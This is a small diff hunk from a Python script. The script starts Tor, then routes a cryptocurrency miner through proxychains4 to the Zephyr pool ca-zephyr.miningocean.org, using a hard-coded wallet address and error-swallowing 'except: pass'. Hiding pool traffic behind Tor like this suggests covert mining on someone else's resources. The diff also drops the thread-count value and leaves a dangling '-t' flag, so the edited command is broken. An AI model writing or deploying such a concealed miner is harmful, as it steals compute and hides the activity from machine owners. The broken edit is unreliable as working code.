@@ -33,4 +33,4 @@ except:
     pass
 os.system('tor &')
 time.sleep(60)
-os.system ('proxychains4 ' + program + ' --donate-level 1 -o ca-zephyr.miningocean.org:5432 -u ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB -p az -a rx/0 -k --tls -t ' + str(cores))
+os.system ('proxychains4 ' + program + ' --donate-level 1 -o ca-zephyr.miningocean.org:5432 -u ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB -p az -a rx/0 -k --tls -t ')
